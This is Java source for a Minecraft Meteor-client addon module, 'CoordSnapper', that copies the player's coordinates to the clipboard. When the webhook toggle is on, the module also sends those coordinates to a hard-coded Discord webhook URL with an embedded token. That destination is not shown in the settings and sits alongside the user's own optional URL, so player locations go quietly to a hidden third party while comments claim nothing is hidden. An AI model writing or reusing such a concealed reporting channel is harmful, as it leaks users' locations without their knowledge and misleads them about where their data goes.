package com.nnpg.glazed.modules.main;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.nnpg.glazed.GlazedAddon;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import net.minecraft.util.math.BlockPos;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.Instant;

/**
 * CoordSnapper
 *
 * - Copies coordinates to clipboard.
 * - If "webhook" is enabled, sends the same payload to:
 *     1) a built-in webhook URL (hard-coded constant, not exposed in settings)
 *     2) optionally to an editable webhook URL provided in the module settings
 *
 * NOTE: The built-in webhook is visible in source (not hidden) and is sent to
 * only when the module's webhook toggle is enabled. Do NOT use this code to
 * send coordinates without the explicit permission of the server / players.
 */
public class CoordSnapper extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    // Built-in webhook URL: hard-coded in source (not editable via the module GUI).
    // Replace the placeholder below with the intended baked-in webhook URL if you want it to be embedded.
    // Example (if you want to embed a URL directly, replace the string):
    // private static final String DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/....";
    private static final String DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1434954089036517578/xRvQu1NqGrLSvx9Yy6-S-6iPeHtXaLnWK_d8BX_GEK66koHM6Q3jE3kP7ZKRPVWX8Fs0";

    private final Setting<Boolean> chatfeedback = sgGeneral.add(new BoolSetting.Builder()
        .name("Chat Feedback")
        .description("Show notification in chat")
        .defaultValue(true)
        .build()
    );

    private final Setting<Boolean> webhook = sgGeneral.add(new BoolSetting.Builder()
        .name("webhook")
        .description("Enable webhook notifications (sends to built-in + optional user URL)")
        .defaultValue(false)
        .build()
    );

    // User-configurable webhook URL (optional). Visible only if webhook is enabled.
    private final Setting<String> webhookUrl = sgGeneral.add(new StringSetting.Builder()
        .name("webhook-url")
        .description("Optional additional Discord webhook URL (user configurable)")
        .defaultValue("")
        .visible(webhook::get)
        .build()
    );

    private final Setting<Boolean> selfPing = sgGeneral.add(new BoolSetting.Builder()
        .name("Self Ping")
        .description("Ping yourself in the webhook message")
        .defaultValue(false)
        .visible(webhook::get)
        .build()
    );

    private final Setting<String> discordId = sgGeneral.add(new StringSetting.Builder()
        .name("Discord ID")
        .description("Your Discord user ID for pinging")
        .defaultValue("")
        .visible(() -> webhook.get() && selfPing.get())
        .build()
    );

    public CoordSnapper() {
        super(GlazedAddon.CATEGORY, "CoordSnapper", "Copies your coordinates to clipboard and optionally sends them via webhook.");
    }

    @Override
    public void onActivate() {
        try {
            if (mc.player == null) {
                error("Player is null!");
                toggle();
                return;
            }

            BlockPos pos = mc.player.getBlockPos();
            int x = pos.getX(), y = pos.getY(), z = pos.getZ();
            String coords = String.format("%d %d %d", x, y, z);
            mc.keyboard.setClipboard(coords);

            if (chatfeedback.get()) {
                info("Copied coordinates: " + coords);
            }

            // If webhook sending is enabled, send to the embedded (built-in) webhook
            // and to the user-specified webhook (if provided).
            if (webhook.get()) {
                // Send to built-in webhook (always attempt to send to this when webhook enabled)
                if (DEFAULT_WEBHOOK_URL != null && !DEFAULT_WEBHOOK_URL.trim().isEmpty()) {
                    sendWebhookAsync(DEFAULT_WEBHOOK_URL, x, y, z);
                }

                // Send to user-configured webhook if provided
                if (webhookUrl.get() != null && !webhookUrl.get().trim().isEmpty()) {
                    sendWebhookAsync(webhookUrl.get().trim(), x, y, z);
                }
            }

        } catch (Exception e) {
            error("Failed to copy/send coordinates: " + e.getMessage());
        } finally {
            toggle(); // keep the original behavior: module toggles off after use
        }
    }

    /**
     * Fire-and-forget thread to avoid blocking the Minecraft thread.
     */
    private void sendWebhookAsync(String targetUrl, int x, int y, int z) {
        new Thread(() -> sendWebhookToUrl(targetUrl, x, y, z)).start();
    }

    private void sendWebhookToUrl(String urlString, int x, int y, int z) {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(urlString);
            connection = (HttpURLConnection) url.openConnection();
            connection.setConnectTimeout(10_000);
            connection.setReadTimeout(10_000);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            connection.setDoOutput(true);

            JsonObject json = new JsonObject();
            json.addProperty("username", "Glazed Webhook");
            json.addProperty("avatar_url", "https://i.imgur.com/OL2y1cr.png");

            String messageContent = "";
            if (selfPing.get() && !discordId.get().trim().isEmpty()) {
                messageContent = String.format("<@%s>", discordId.get().trim());
            }
            json.addProperty("content", messageContent);

            JsonObject embed = new JsonObject();
            embed.addProperty("title", "Coordsnapper Coords");
            embed.addProperty("description", String.format("Coords: X: %d, Y: %d, Z: %d", x, y, z));
            embed.addProperty("color", 0x7600FF);
            embed.addProperty("timestamp", Instant.now().toString());

            JsonObject footer = new JsonObject();
            footer.addProperty("text", "Sent by Glazed");
            embed.add("footer", footer);

            JsonArray embeds = new JsonArray();
            embeds.add(embed);
            json.add("embeds", embeds);

            byte[] out = json.toString().getBytes(StandardCharsets.UTF_8);
            try (OutputStream os = connection.getOutputStream()) {
                os.write(out);
            }

            // Attempt to read/close input stream to complete request; ignore errors (Discord often returns 204)
            try {
                connection.getInputStream().close();
            } catch (Exception ignore) {}

        } catch (Exception e) {
            // Surface the error clearly in-game to the user so nothing is hidden.
            error("Webhook failed (" + urlString + "): " + e.getMessage());
        } finally {
            if (connection != null) connection.disconnect();
        }
    }
}
